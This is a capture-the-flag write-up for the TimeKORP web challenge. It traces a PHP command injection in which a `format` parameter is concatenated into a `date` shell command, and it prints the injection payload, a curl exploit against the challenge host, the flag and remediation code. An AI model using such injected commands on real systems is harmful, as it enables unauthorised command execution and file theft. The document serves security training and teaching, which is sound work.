# TimeKORP CTF Challenge - Solution Writeup

**Challenge Name:** TimeKORP  
**Category:** Web  
**Difficulty:** Very Easy  
**Points:** 925  
**Date Solved:** 2025-11-09

---

## Challenge Description

"Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine."

---

## Target Information

- **IP Address:** 83.136.255.106
- **Port:** 30702
- **URL:** http://83.136.255.106:30702

---

## Reconnaissance

### File Structure Analysis

The challenge provides source code with the following structure:

```
timecorp/
├── Dockerfile
├── build_docker.sh
├── challenge/
│   ├── Router.php
│   ├── index.php
│   ├── controllers/
│   │   └── TimeController.php
│   ├── models/
│   │   └── TimeModel.php
│   └── views/
│       └── index.php
├── config/
│   ├── fpm.conf
│   ├── nginx.conf
│   └── supervisord.conf
└── flag
```

### Key Files Reviewed

#### 1. index.php
- Entry point for the application
- Sets up autoloading for controllers and models
- Defines a single route: `GET /` → `TimeController@index`

#### 2. TimeController.php
```php
public function index($router)
{
    $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
    $time = new TimeModel($format);
    return $router->view('index', ['time' => $time->getTime()]);
}
```
- Accepts a `format` parameter from GET request
- Passes it directly to TimeModel without validation

#### 3. TimeModel.php (VULNERABLE)
```php
public function __construct($format)
{
    $this->command = "date '+" . $format . "' 2>&1";
}

public function getTime()
{
    $time = exec($this->command);
    $res  = isset($time) ? $time : '?';
    return $res;
}
```

---

## Vulnerability Analysis

### Command Injection (CWE-78)

**Location:** `models/TimeModel.php`

**Issue:** The `format` parameter from user input is directly concatenated into a shell command without any sanitization or validation.

**Vulnerable Code:**
```php
$this->command = "date '+" . $format . "' 2>&1";
$time = exec($this->command);
```

**Attack Vector:** By injecting shell metacharacters, an attacker can break out of the intended `date` command and execute arbitrary system commands.

---

## Exploitation

### Payload Construction

The payload needs to:
1. Close the single quote in the date command
2. Add a command separator (`&&`)
3. Execute the desired command (`cat /flag`)
4. Add another command separator
5. Add a dummy echo to close the syntax

**Payload:** `%H:%M:%S' && cat /flag && echo '`

### URL Construction

```
http://83.136.255.106:30702/?format=%H:%M:%S'%20%26%26%20cat%20/flag%20%26%26%20echo%20'
```

**URL Encoding:**
- Space: `%20`
- `&`: `%26`
- Single quote: Can be left unencoded

### Exploit Command

```bash
curl -s "http://83.136.255.106:30702/?format=%H:%M:%S'%20%26%26%20cat%20/flag%20%26%26%20echo%20'"
```

### Result

The server executes:
```bash
date '+%H:%M:%S' && cat /flag && echo '' 2>&1
```

And returns the flag in the HTML response.

---

## Flag

```
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_55bdeff6c5c4125ca1244de13d899b3f}
```

---

## Remediation Recommendations

### 1. Input Validation
```php
public function __construct($format)
{
    // Whitelist allowed format characters
    if (!preg_match('/^[%A-Za-z0-9:\-\s]+$/', $format)) {
        throw new Exception('Invalid format');
    }
    $this->format = $format;
}
```

### 2. Use Safe Functions
```php
public function getTime()
{
    // Use PHP's native date function instead of shell execution
    $time = date($this->format);
    return $time;
}
```

### 3. Escape Shell Arguments
If shell execution is necessary:
```php
$this->command = "date '+" . escapeshellarg($format) . "'";
```

### 4. Principle of Least Privilege
- Run the web application with minimal permissions
- Ensure the flag file is not readable by the web user in production

---

## Lessons Learned

1. **Never trust user input** - All user-supplied data must be validated and sanitized
2. **Avoid shell execution** - Use native language functions when possible
3. **Defense in depth** - Multiple layers of security prevent exploitation
4. **Command injection is critical** - Can lead to complete system compromise

---

## OWASP References

- **A03:2021 – Injection**
- **CWE-78: OS Command Injection**

---

## Tools Used

- `curl` - HTTP client for exploitation
- Manual code review - Source code analysis

---

## Timeline

1. **00:00** - Challenge started, downloaded source files
2. **00:02** - Identified command injection vulnerability in TimeModel.php
3. **00:03** - Crafted and tested exploit payload
4. **00:04** - Successfully retrieved flag

**Total Time:** ~4 minutes

---

## Additional Notes

This challenge demonstrates the dangers of:
- Unsafe use of `exec()`, `system()`, `shell_exec()` functions
- Direct concatenation of user input into shell commands
- Lack of input validation and sanitization

The challenge name "TimeKORP" is a hint - it's about time-related functionality, and "KORP" reversed gives us "PROK" (though the actual company name in the description is "KROP").

